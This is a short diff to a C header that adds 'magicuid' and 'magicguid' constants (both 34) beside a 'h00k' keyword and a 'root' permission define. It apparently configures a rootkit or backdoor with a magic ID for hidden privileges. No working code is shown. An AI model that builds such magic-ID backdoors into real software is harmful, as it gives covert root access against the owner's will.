@@ -3,5 +3,7 @@
 
 #define keyword "h00k"
 #define permission "root"
+#define magicuid 34
+#define magicguid 34
 
 #endif
